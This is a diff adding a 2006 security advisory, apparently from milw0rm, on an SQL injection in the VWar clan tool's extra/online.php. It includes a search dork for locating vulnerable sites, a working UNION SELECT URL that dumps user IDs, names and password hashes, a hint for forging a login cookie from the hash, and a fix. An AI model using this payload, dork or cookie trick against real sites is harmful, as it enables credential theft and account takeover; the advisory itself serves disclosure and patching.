@@ -1,0 +1,110 @@
+    .:[ insecurity research team ]:.
+     .__..____.:.______.____.:.____ .
+ .:. |  |/    \:/  ___// __ \:/   _\.:.
+   : |  |   |  \\____\\  ___/\   /__ :. .
+ ..: |__|___|  /____  >\___  >\___  >.:
+   .:.. ..  .\/   .:\/:.  .\/.  .:\/:
+ .   ...:.    .advisory.    .:...
+         :..................: 1o.o8.2oo6 ..
+ 
+ 
+  Affected Application: VWar <= v1.50 R14
+ 
+ 
+ . . :[ contact ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  Discoverd by: brOmstar
+ 
+  Team: Insecurity Research Team
+ 
+  URL: http://www.insecurityresearch.org
+ 
+  E-Mail: brom0815@gmx.de
+ 
+ 
+ 
+ . . :[ insecure application details ]: . . . . . . . . . . . . . . . . .
+ 
+ 
+  Typ: Remote [x]  Local [ ]
+ 
+       Remote File Inclusion [ ]  SQL Injection [x]
+ 
+  Level: Low [ ]  Middle [ ]  High [x]
+ 
+  Application: VWar
+ 
+  Version: <= v1.50 R14
+ 
+  Vulnerable File: extra/online.php
+
+  Vulnerable Variable: n
+ 
+  URL: http://www.vwar.de
+ 
+  Description: Virtual War is a tool for gaming clans.
+ 
+  Dork: intext:"Powered by: Virtual War v1.5.0"
+
+
+
+ . . :[ code snippet ]: . . . . . . . . . . . . . . . . . . . . . . . . .
+
+
+  line 63: $query = $vwardb->query("
+
+  line 64:	SELECT memberid, name, lastactivity
+
+  line 65:	FROM vwar".$n."_member WHERE lastactivity > ".(time() - 
+
+                $onlinetime * 60)."
+
+  line 66: ");
+
+ 
+
+ . . :[ exploit ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+
+  example: if you want a list of userid/username/password's try this:
+
+
+  http://www.vwar.de/demo/extra/online.php?n=_member%20WHERE%20memberid=-999%20UNION%20SELECT%200,CONCAT(memberid,0x3A,name,0x3A,password),2%20FROM%20vwar_member%20%20/*
+ 
+  
+  encrypt the md5-password again with md5 and throw it in a cookie... :-)
+ 
+
+
+ . . :[ how to fix ]: . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  o1.) open extra/online.php
+ 
+  o2.) take a look at the following lines:
+
+       41: if( !defined ("VWAR_COMMON_INCLUDED") )
+ 	
+       42: {
+
+       43: $vwar_root = $vwar_xroot;
+
+       44: require_once ( $vwar_root . "includes/functions_common.php" );
+
+       45: }
+ 
+  o3.) add between line 44 and 45 this:
+
+       require_once ( $vwar_root . "includes/_config.inc.php" );
+ 
+  o4.) done!
+ 
+ 
+ 
+ . . :[ greets ]: . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  buzzdee, camino and my lovely, sexy girlfriend!
+
+# milw0rm.com [2006-08-10]
